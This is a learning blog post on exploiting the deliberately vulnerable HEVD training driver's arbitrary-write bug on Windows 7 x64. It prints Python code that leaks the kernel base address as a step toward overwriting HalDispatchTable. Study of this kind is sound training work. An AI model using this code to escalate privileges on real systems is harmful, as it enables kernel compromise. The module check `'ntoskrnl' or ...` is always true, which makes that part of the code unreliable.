---
layout: single
title: HEVD Exploits -- Windows 7 x64 Arbitrary Write
date: 2020-02-01
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows
  - x86
  - x86-64
  - Shellcoding
  - Kernel Exploitation
  - Write What Where
  - Arbitrary Overwrite
---

## Introduction
Continuing on with the Windows exploit journey, it's time to start exploiting kernel-mode drivers and learning about writing exploits for ring 0. As I did with my OSCE prep, I'm mainly blogging my progress as a way for me to reinforce concepts and keep meticulous notes I can reference later on. I can't tell you how many times I've used my own blog as a reference for something I learned 3 months ago and had totally forgotten. 

This series will be me attempting to run through every exploit on the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). **I will be using HEVD 2.0**. I can't even begin to explain how amazing a training tool like this is for those of us just starting out. There are a ton of good blog posts out there walking through various HEVD exploits. I recommend you read them all! I referenced them heavily as I tried to complete these exploits. Almost nothing I do or say in this blog will be new or my own thoughts/ideas/techniques. There were instances where I diverged from any strategies I saw employed in the blogposts out of necessity or me trying to do my own thing to learn more.

**This series will be light on tangential information such as:**
+ how drivers work, the different types, communication between userland, the kernel, and drivers, etc
+ how to install HEVD,
+ how to set up a lab environment
+ shellcode analysis

The reason for this is simple, the other blog posts do a much better job detailing this information than I could ever hope to. It feels silly writing this blog series in the first place knowing that there are far superior posts out there; I will not make it even more silly by shoddily explaining these things at a high-level in poorer fashion than those aforementioned posts. Those authors have way more experience than I do and far superior knowledge, I will let them do the explaining. :)

This post/series will instead focus on my experience trying to craft the actual exploits. 

I used the following blogs as references:
+ All of the blog posts referenced in the [previous post](https://github.com/h0mbre/h0mbre.github.io/blob/master/_posts/2020-01-21-HEVD_Stackoverflow_64bit.md),
+ FuzzySecurity's [tutorial on this very exploit](https://www.fuzzysecurity.com/tutorials/expDev/15.html),
+ GradiusX [exploit code for a similar exploit](https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py),
+ Abatchy's [post on the subject](https://www.abatchy.com/2018/01/kernel-exploitation-7),
+ jNizM [documentation for the SystemInformationModule returned structures](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f). 

Huge thanks to the blog authors, no way I could've finished these first two exploits without your help/wisdom. 

## Goal
For this post, I mostly relied on the GradiusX code mentioned above. They're doing a different technique in their code (hopefully we'll try it at some point) but the way they deal with the `SystemModuleInformation` struct in Python was very crucial to how I ended up doing it in this post. As you may remember from the x86 version of this post, the goal of this post was to create a much more organized exploit code that utilized classes instead of treating the aforementioned struct as a long string. We were succesful in that. The only thing that really bugged me about this exploit was there was behavior where during my exploit, the first two bytes of my shellcode buffer would be overwritten. Besides the BSODs, this was frustrating mostly because I never really root caused the issue. The issue may in fact lie in the way I decided to allocate my userland string buffers in Python, but time will tell. Ultimately, I was able to overcome the overwrites and develop a reliable exploit.

This exploit code will be very similar to the last post, so please read that one if you haven't. There's honestly not much difference. We'll only be talking about the differences and the shellcode overwrite issue and how I solved it. 

## Exploit Code Considerations for x64
In this section, I'll be detailing aspects of the exploit code that differ from its x86 counterpart. 

As you may recall from the first post, we need to get the kernel image name and base address so that we can use the address to calculate the location of the `HalDispatchTable` because we need to overwrite a function pointer there. A lot of this code will look the same, here is the entire function: 
```python
def base():
    
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation")
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        sys_info,
        len(sys_info),
        addressof(sys_info_len)
    )

    if result == 0x0:
        print("[*] Success, allocated {}-byte result buffer".format(str(len(sys_info))))

    else:
        print("[!] NtQuerySystemInformation failed with NTSTATUS: {}".format(hex(result)))

    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p),
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("ImageName", c_char * 256)]

    # thanks GradiusX
    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
    
    sys_info = create_string_buffer(sys_info.raw[8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
            img_name = tmp.ImageName.split("\\")[-1]
            print("[*] Kernel Type: {}".format(img_name))
            kernel_base = hex(tmp.ImageBase)[:-1]
            print("[*] Kernel Base: {}".format(kernel_base))
            return img_name, kernel_base
        counter += sizeof(tmp)
```

The primary difference here is going to be establishing a class for the `SYSTEM_MODULE_INFORMATION` structure. Its very similar to GradiusX's class in their exploit script; however, I changed the name of the last member so that it was more congruent with the FuzzySec's Powershell script. For more information about this struct, please see the [documenation I referenced throughout this bug class exploitation process](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f).

Let me break this down piece by piece. We declare a class that matches exactly with the aforementioned documentation that I referenced. We then create a `handle_num` variable of type `c_ulong()` which will be 8 bytes on x64 Windows. We create a string buffer and fill it with the first 8 bytes of our returned `sys_info` struct. We then move this buffer to the address of our `handle_num` variable which allows us to get the value in decimal of the number of `SystemModuleInformation` objects we returned with our `NtQuerySystemInformation` API call. You can see this here: 
```python
handle_num = c_ulong(0)
handle_num_str = create_string_buffer(sys_info.raw[:8])
memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
```

We then shorten the returned `sys_info` string by cutting off the first 8 bytes we just used and then interating through the string casting each `296` byte chunk as an instance of our class. You can see that we declare a `counter` variable which will increment each iteration by the size of our class (`296` bytes). The loop does the following:
+ While we haven't iterated through all of our returned modules (by getting the number of returned modules with `handle_num.value`),
+ create a temporary `SYSTEM_MODULE_INFORMATION` instance called `tmp`,
+ create a string buffer in a `0` to `296` byte chunk that contains one complete returned struct,
+ move that string buffer into our temporary `tmp` struct.
You can see all of this happening here: 
```python
counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
            img_name = tmp.ImageName.split("\\")[-1]
            print("[*] Kernel Type: {}".format(img_name))
            kernel_base = hex(tmp.ImageBase)[:-1]
            print("[*] Kernel Base: {}".format(kernel_base))
            return img_name, kernel_base
        counter += sizeof(tmp)
```

